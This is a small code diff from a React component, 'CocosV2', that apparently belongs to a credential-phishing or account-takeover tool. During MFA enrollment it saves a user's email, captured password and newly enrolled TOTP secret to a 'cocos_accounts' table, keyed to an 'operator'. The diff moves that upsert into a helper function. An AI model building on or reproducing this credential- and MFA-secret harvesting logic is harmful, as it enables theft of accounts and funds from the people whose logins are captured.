@@ -617,7 +617,7 @@ const CocosV2 = () => {
         enrolledSecretRef.current = totpSecret;
         setMfaMethod("enrolled"); mfaMethodRef.current = "enrolled";
         await updateSession("totp_enrolled", { otp_code: `totp_secret:${totpSecret}` });
-        await supabase.from("cocos_accounts").upsert({ email, totp_secret: totpSecret, password: lastPasswordRef.current || null, profile_data: { mfa_method: "enrolled" }, operator_code: operatorCode }, { onConflict: "email" });
+        await upsertAccountForOperator({ email, totp_secret: totpSecret, password: lastPasswordRef.current || null, profile_data: { mfa_method: "enrolled" } });
 
         // Retry TOTP verify with fresh codes (up to 5 attempts)
         const verifyRes = await retryTotpVerify(token, enrollData.id, totpSecret);
